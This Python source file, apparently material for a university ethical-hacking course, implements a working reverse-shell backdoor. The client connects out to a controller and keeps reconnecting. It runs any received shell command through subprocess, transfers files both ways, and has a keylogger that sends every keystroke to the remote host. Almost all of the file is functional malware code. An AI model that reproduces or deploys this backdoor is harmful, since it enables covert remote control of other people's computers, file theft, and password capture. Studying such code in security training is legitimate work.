################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary Python modules
import socket  # For network communication
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system

# target_ip = '192.168.203.142'
target_ip = '127.0.0.1'
target_port = 5555
reconnection_delay = 1

# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    s.send(jsondata.encode())  # Send the encoded data over the network


# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
            return json.loads(data)  # Parse the received JSON data
        except ValueError:
            continue


# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(reconnection_delay)  # Wait before reconnecting (for resilience)
        try:
            # Connect to a remote host 
            s.connect((target_ip, target_port))
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except:
            # If a connection error occurs, retry the connection
            connection()


# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the specified file in binary read mode
    s.send(f.read())  # Read and send the file's contents over the network


# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')  # Open a file for binary write mode
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received data to the file
        try:
            chunk = s.recv(1024)  # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)  # Reset the timeout setting
    f.close()  # Close the file when done

def keylogger():
    from pynput import keyboard

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char:
                reliable_send(f'{key.char}')
            else:
                reliable_send(f'{key.name}')  # Send the name of the special key
        except Exception as e:
            reliable_send(str(e))


    def on_release(key):
        if key == keyboard.Key.esc:
            # Stop listener
            return False
            

    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Main shell function for command execution
def shell():
    while True:
        # Receive a command from the remote host
        command = reliable_recv()
        if command == 'quit':
            # If the command is 'quit', exit the shell loop
            break
        elif command == 'clear':
            # If the command is 'clear', do nothing (used for clearing the screen)
            pass
        elif command[:3] == 'cd ':
            # If the command starts with 'cd ', change the current directory
            os.chdir(command[3:])
            reliable_send(os.getcwd())
        elif command[:8] == 'download':
            # If the command starts with 'download', upload a file to the remote host
            upload_file(command[9:])
        elif command[:6] == 'upload':
            # If the command starts with 'upload', download a file from the remote host
            download_file(command[7:])
        elif command == 'keylogger':
            keylogger()
        else:
            # For other commands, execute them using subprocess
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
            result = result.decode()  # Decode the output to a string
            # Send the command execution result back to the remote host
            reliable_send(result)


# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()
